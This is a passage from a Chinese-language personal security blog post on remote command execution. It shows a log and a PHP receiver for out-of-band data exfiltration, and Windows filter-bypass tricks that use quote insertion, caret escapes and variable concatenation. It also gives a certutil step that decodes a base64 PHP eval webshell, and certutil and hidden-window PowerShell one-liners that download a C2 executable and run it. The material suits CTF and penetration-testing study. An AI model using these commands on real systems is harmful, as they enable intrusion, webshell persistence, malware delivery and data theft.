<h5 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">124.223.158.81 - - [19/Feb/2023:08:47:08 +0000] &quot;GET /x.php?1=Y3Rmc2hvd3sxMGRkODQ5Ni0xZDQ3LTRmYWQtODE3Mi1kNmI0ZDBlMWMwZWN9Cg== HTTP/1.0&quot; 404 466 &quot;-&quot; &quot;-&quot;</span><br><span class="line">[Sun Feb 19 08:47:08.149766 2023] [:error] [pid 2113] [client 124.223.158.81:53652] script &#x27;/var/www/html/x.php&#x27; not found or unable to stat</span><br></pre></td></tr></table></figure>

<h5 id="使用php脚本配合外带数据"><a href="#使用php脚本配合外带数据" class="headerlink" title="使用php脚本配合外带数据"></a>使用php脚本配合外带数据</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;更新时间:&#x27;</span>.date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>).<span class="string">&quot;\n&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no data input&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="windows端执行"><a href="#windows端执行" class="headerlink" title="windows端执行"></a>windows端执行</h2><p>windows端很多字符都是没有特殊含义的，所以绕过思路比较少</p>
<h3 id="命令执行中的各种绕过-1"><a href="#命令执行中的各种绕过-1" class="headerlink" title="命令执行中的各种绕过"></a>命令执行中的各种绕过</h3><h4 id="绕过空格-1"><a href="#绕过空格-1" class="headerlink" title="绕过空格"></a>绕过空格</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo/123&gt;&gt;s1.php</span><br><span class="line">echo,123&gt;&gt;s1.php</span><br></pre></td></tr></table></figure>
<h4 id="绕过关键字-1"><a href="#绕过关键字-1" class="headerlink" title="绕过关键字"></a>绕过关键字</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">wh&quot;oam&quot;i</span><br><span class="line">wh&quot;oami</span><br><span class="line">wh&quot;&quot;oami</span><br><span class="line"></span><br><span class="line">#在win中^代表转义字符</span><br><span class="line">wh^oami   </span><br><span class="line">wh^o^ami</span><br><span class="line"></span><br><span class="line">#分组绕过</span><br><span class="line">set a=who&amp;&amp;set b=ami &amp;&amp; call %a%%b%</span><br><span class="line"></span><br><span class="line">#base64编码绕过</span><br><span class="line">echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pg== &gt; ./base64-data-1.txt</span><br><span class="line">certutil -f -decode ./base64-data-1.txt ./1.php</span><br></pre></td></tr></table></figure>
<h3 id="无回显rce-1"><a href="#无回显rce-1" class="headerlink" title="无回显rce"></a>无回显rce</h3><h4 id="判断是否存在盲注-1"><a href="#判断是否存在盲注-1" class="headerlink" title="判断是否存在盲注"></a>判断是否存在盲注</h4><p>使用 timeout 命令:<br><code>timeout /t 5</code><br>这条命令会让命令行暂停 5 秒钟。/t 后面的数字表示暂停的时间（单位是秒）。</p>
<p>使用 ping 命令:<br>你还可以通过 ping 命令模拟延时：<br><code>ping 127.0.0.1 -n 6 &gt; nul</code><br>这里的 -n 6 表示 ping 命令会发送 6 次请求，间隔 1 秒，所以总共会等待大约 5 秒钟</p>
<h4 id="上传c2"><a href="#上传c2" class="headerlink" title="上传c2"></a>上传c2</h4><p>通过 Certutil 远程下载C2文件并执行<br><code>certutil -urlcache -gmt -split -f http://C2文件远程地址 C2文件名.exe &amp;&amp; C2文件名.exe 执行参数</code><br>通过 PowerShell 远程下载C2文件并执行<br><code>powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#39;http://C2文件远程地址&#39;,&#39;C2文件名.exe&#39;) &amp;&amp; C2文件名.exe 执行参数</code></p>

        </div>

        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/rce/"># rce</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/09/10/php/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">php代码执行</a>
            
            
            <a class="next" rel="next" href="/2022/07/15/php/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/">php文件包含漏洞和伪协议</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>